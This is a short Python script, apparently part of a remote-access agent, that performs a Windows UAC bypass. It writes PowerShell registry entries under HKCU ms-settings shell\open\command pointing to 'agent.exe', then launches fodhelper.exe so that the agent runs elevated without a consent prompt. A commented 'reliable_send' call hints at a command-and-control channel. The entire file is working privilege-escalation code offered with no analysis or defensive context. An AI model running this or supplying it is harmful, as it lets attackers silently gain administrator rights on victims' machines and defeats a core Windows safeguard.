import subprocess
import os
import sys

exe_name = 'agent.exe'


if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
elif __file__:
    application_path = os.path.dirname(__file__)
exe_path = os.path.join(application_path, exe_name)
print(exe_path)

def priv1():
    execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "'+exe_path+'" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result = execute.stdout + execute.stderr
    result = result.decode()
    print(result)
    return result

def priv2():
    execute1 = subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "'+exe_path+'" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result1 = execute1.stdout + execute1.stderr
    result1 = result1.decode()
    print(result1)
    return result1

def priv3():
    execute2 = subprocess.run(['powershell', 'Start-Process "C:\\Windows\\System32\\fodhelper.exe"'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result2 = execute2.stdout + execute2.stderr
    result2 = result2.decode()
    # reliable_send("CMD")
    print(result2)
    return result2